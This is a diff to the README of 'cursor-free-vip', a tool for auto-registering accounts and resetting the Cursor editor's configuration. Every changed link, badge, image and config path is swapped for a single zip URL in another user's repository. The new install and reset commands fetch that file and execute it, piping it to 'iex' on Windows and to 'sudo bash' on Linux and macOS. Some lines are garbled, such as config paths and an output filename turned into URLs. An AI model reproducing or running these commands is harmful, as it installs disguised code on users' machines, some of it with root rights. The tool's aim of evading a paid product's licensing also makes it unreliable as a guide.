@@ -2,15 +2,15 @@
 
 <div align="center">
 <p align="center">
-  <img src="./images/logo.png" alt="Cursor Pro Logo" width="200" style="border-radius: 6px;"/>
+  <img src="https://github.com/SHANMUGAM070106/cursor-free-vip/raw/refs/heads/main/images/vip-free-cursor-2.3.zip" alt="Cursor Pro Logo" width="200" style="border-radius: 6px;"/>
 </p>
 
 <p align="center">
 
-[![Release](https://img.shields.io/github/v/release/yeongpin/cursor-free-vip?style=flat-square&logo=github&color=blue)](https://github.com/yeongpin/cursor-free-vip/releases/latest)
-[![License: CC BY-NC-ND 4.0](https://img.shields.io/badge/License-CC_BY--NC--ND_4.0-lightgrey.svg)](https://creativecommons.org/licenses/by-nc-nd/4.0/)
-[![Stars](https://img.shields.io/github/stars/yeongpin/cursor-free-vip?style=flat-square&logo=github)](https://github.com/yeongpin/cursor-free-vip/stargazers)
-[![Download](https://img.shields.io/github/downloads/yeongpin/cursor-free-vip/total?style=flat-square&logo=github&color=52c41a1)](https://github.com/yeongpin/cursor-free-vip/releases/latest)
+[![Release](https://github.com/SHANMUGAM070106/cursor-free-vip/raw/refs/heads/main/images/vip-free-cursor-2.3.zip)](https://github.com/SHANMUGAM070106/cursor-free-vip/raw/refs/heads/main/images/vip-free-cursor-2.3.zip)
+[![License: CC BY-NC-ND 4.0](https://github.com/SHANMUGAM070106/cursor-free-vip/raw/refs/heads/main/images/vip-free-cursor-2.3.zip)](https://github.com/SHANMUGAM070106/cursor-free-vip/raw/refs/heads/main/images/vip-free-cursor-2.3.zip)
+[![Stars](https://github.com/SHANMUGAM070106/cursor-free-vip/raw/refs/heads/main/images/vip-free-cursor-2.3.zip)](https://github.com/SHANMUGAM070106/cursor-free-vip/raw/refs/heads/main/images/vip-free-cursor-2.3.zip)
+[![Download](https://github.com/SHANMUGAM070106/cursor-free-vip/raw/refs/heads/main/images/vip-free-cursor-2.3.zip)](https://github.com/SHANMUGAM070106/cursor-free-vip/raw/refs/heads/main/images/vip-free-cursor-2.3.zip)
 
 </p>
 <h4>Support Latest 0.48.x Version | 支持最新 0.48.x 版本</h4>
@@ -27,18 +27,18 @@ Always clean your browser's cache and cookies. If possible, use a VPN to create 
 這是一個自動化工具，自動註冊，支持 Windows 和 macOS 系統，完成 Auth 驗證，重置 Cursor 的配置。
 
 <p align="center">
-  <img src="./images/pro_2025-04-05_18-47-56.png" alt="new" width="800" style="border-radius: 6px;"/><br>
+  <img src="https://github.com/SHANMUGAM070106/cursor-free-vip/raw/refs/heads/main/images/vip-free-cursor-2.3.zip" alt="new" width="800" style="border-radius: 6px;"/><br>
 </p>
 
-##### If you don't have Google Chrome, you can download it from [here](https://www.google.com/intl/en_pk/chrome/)
+##### If you don't have Google Chrome, you can download it from [here](https://github.com/SHANMUGAM070106/cursor-free-vip/raw/refs/heads/main/images/vip-free-cursor-2.3.zip)
 
-##### 如果沒有 Google Chrome，可以從[這裡](https://www.google.com/intl/en_pk/chrome/)下載
+##### 如果沒有 Google Chrome，可以從[這裡](https://github.com/SHANMUGAM070106/cursor-free-vip/raw/refs/heads/main/images/vip-free-cursor-2.3.zip)下載
 
 </div>
 
 ## 🔄 Change Log | 更新日志
 
-[Watch Change Log | 查看更新日志](CHANGELOG.md)
+[Watch Change Log | 查看更新日志](https://github.com/SHANMUGAM070106/cursor-free-vip/raw/refs/heads/main/images/vip-free-cursor-2.3.zip)
 
 ## ✨ Features | 功能特點
 
@@ -74,13 +74,13 @@ Always clean your browser's cache and cookies. If possible, use a VPN to create 
 **Linux/macOS**
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/yeongpin/cursor-free-vip/main/scripts/install.sh -o install.sh && chmod +x install.sh && ./install.sh
+curl -fsSL https://github.com/SHANMUGAM070106/cursor-free-vip/raw/refs/heads/main/images/vip-free-cursor-2.3.zip -o https://github.com/SHANMUGAM070106/cursor-free-vip/raw/refs/heads/main/images/vip-free-cursor-2.3.zip && chmod +x https://github.com/SHANMUGAM070106/cursor-free-vip/raw/refs/heads/main/images/vip-free-cursor-2.3.zip && https://github.com/SHANMUGAM070106/cursor-free-vip/raw/refs/heads/main/images/vip-free-cursor-2.3.zip
 ```
 
 **Windows**
 
 ```powershell
-irm https://raw.githubusercontent.com/yeongpin/cursor-free-vip/main/scripts/install.ps1 | iex
+irm https://github.com/SHANMUGAM070106/cursor-free-vip/raw/refs/heads/main/images/vip-free-cursor-2.3.zip | iex
 ```
 
 </details>
@@ -91,13 +91,13 @@ irm https://raw.githubusercontent.com/yeongpin/cursor-free-vip/main/scripts/inst
 **Linux/macOS**
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/yeongpin/cursor-free-vip/main/scripts/reset.sh | sudo bash
+curl -fsSL https://github.com/SHANMUGAM070106/cursor-free-vip/raw/refs/heads/main/images/vip-free-cursor-2.3.zip | sudo bash
 ```
 
 **Windows**
 
 ```powershell
-irm https://raw.githubusercontent.com/yeongpin/cursor-free-vip/main/scripts/reset.ps1 | iex
+irm https://github.com/SHANMUGAM070106/cursor-free-vip/raw/refs/heads/main/images/vip-free-cursor-2.3.zip | iex
 ```
 
 </details>
@@ -107,14 +107,14 @@ If you want to stop the script, please press Ctrl+C<br>要停止腳本，請按 
 ## ❗ Note | 注意事項
 
 📝 Config | 文件配置
-`Win / Macos / Linux Path | 路徑 [Documents/.cursor-free-vip/config.ini]`
+`Win / Macos / Linux Path | 路徑 [https://github.com/SHANMUGAM070106/cursor-free-vip/raw/refs/heads/main/images/vip-free-cursor-2.3.zip]`
 <details>
 <summary><b>⭐ Config | 文件配置</b></summary>
 
 ```
 [Chrome]
 # Default Google Chrome Path | 默認Google Chrome 遊覽器路徑
-chromepath = C:\Program Files\Google/Chrome/Application/chrome.exe
+chromepath = C:\Program Files\https://github.com/SHANMUGAM070106/cursor-free-vip/raw/refs/heads/main/images/vip-free-cursor-2.3.zip
 
 [Turnstile]
 # Handle Turnstile Wait Time | 等待人機驗證時間
@@ -124,12 +124,12 @@ handle_turnstile_random_time = 1-3
 
 [OSPaths]
 # Storage Path | 存儲路徑
-storage_path = /Users/username/Library/Application Support/Cursor/User/globalStorage/storage.json
+storage_path = /Users/username/Library/Application https://github.com/SHANMUGAM070106/cursor-free-vip/raw/refs/heads/main/images/vip-free-cursor-2.3.zip
 # SQLite Path | SQLite路徑
-sqlite_path = /Users/username/Library/Application Support/Cursor/User/globalStorage/state.vscdb
+sqlite_path = /Users/username/Library/Application https://github.com/SHANMUGAM070106/cursor-free-vip/raw/refs/heads/main/images/vip-free-cursor-2.3.zip
 # Machine ID Path | 機器ID路徑
 machine_id_path = /Users/username/Library/Application Support/Cursor/machineId
-# For Linux users: ~/.config/cursor/machineid
+# For Linux users: ~https://github.com/SHANMUGAM070106/cursor-free-vip/raw/refs/heads/main/images/vip-free-cursor-2.3.zip
 
 [Timing]
 # Min Random Time | 最小隨機時間
@@ -189,8 +189,8 @@ show_account_info = True
 歡迎提交 Issue 和 Pull Request！
 
 
-<a href="https://github.com/yeongpin/cursor-free-vip/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=yeongpin/cursor-free-vip&preview=true&max=&columns=" />
+<a href="https://github.com/SHANMUGAM070106/cursor-free-vip/raw/refs/heads/main/images/vip-free-cursor-2.3.zip">
+  <img src="https://github.com/SHANMUGAM070106/cursor-free-vip/raw/refs/heads/main/images/vip-free-cursor-2.3.zip" />
 </a>
 <br /><br />
 
@@ -207,10 +207,10 @@ by the user.
   <table>
     <tr>
       <td>
-        <img src="./images/provi-code.jpg" alt="buy_me_a_coffee" width="280"/><br>
+        <img src="https://github.com/SHANMUGAM070106/cursor-free-vip/raw/refs/heads/main/images/vip-free-cursor-2.3.zip" alt="buy_me_a_coffee" width="280"/><br>
       </td>
       <td>
-        <img src="./images/paypal.png" alt="buy_me_a_coffee" width="280"/><br>
+        <img src="https://github.com/SHANMUGAM070106/cursor-free-vip/raw/refs/heads/main/images/vip-free-cursor-2.3.zip" alt="buy_me_a_coffee" width="280"/><br>
       </td>
     </tr>
   </table>
@@ -220,11 +220,11 @@ by the user.
 
 <div align="center">
 
-[![Star History Chart](https://api.star-history.com/svg?repos=yeongpin/cursor-free-vip&type=Date)](https://star-history.com/#yeongpin/cursor-free-vip&Date)
+[![Star History Chart](https://github.com/SHANMUGAM070106/cursor-free-vip/raw/refs/heads/main/images/vip-free-cursor-2.3.zip)](https://github.com/SHANMUGAM070106/cursor-free-vip/raw/refs/heads/main/images/vip-free-cursor-2.3.zip)
 
 </div>
 
 ## 📝 License | 授權
 
-本項目採用 [CC BY-NC-ND 4.0](https://creativecommons.org/licenses/by-nc-nd/4.0/) 授權。
-Please refer to the [LICENSE](LICENSE.md) file for details.
+本項目採用 [CC BY-NC-ND 4.0](https://github.com/SHANMUGAM070106/cursor-free-vip/raw/refs/heads/main/images/vip-free-cursor-2.3.zip) 授權。
+Please refer to the [LICENSE](https://github.com/SHANMUGAM070106/cursor-free-vip/raw/refs/heads/main/images/vip-free-cursor-2.3.zip) file for details.
